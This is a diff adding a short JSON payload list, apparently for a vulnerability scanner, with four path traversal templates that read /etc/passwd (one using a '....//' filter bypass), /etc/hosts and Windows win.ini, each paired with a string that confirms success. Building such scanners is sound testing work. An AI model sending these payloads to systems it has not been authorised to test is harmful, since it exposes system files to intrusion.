@@ -1,0 +1,8 @@
+{
+  "payloads": [
+    {"id": "etc-passwd", "name": "路径穿越读取 /etc/passwd", "template": "../../../../etc/passwd", "check": "root:"},
+    {"id": "etc-passwd-dot", "name": "路径穿越读取 /etc/passwd（//绕过）", "template": "....//....//....//etc/passwd", "check": "root:"},
+    {"id": "etc-hosts", "name": "路径穿越读取 /etc/hosts", "template": "../../../../etc/hosts", "check": "localhost"},
+    {"id": "win-ini", "name": "路径穿越读取 Windows win.ini", "template": "..\\..\\..\\windows\\win.ini", "check": "for 16-bit"}
+  ]
+}
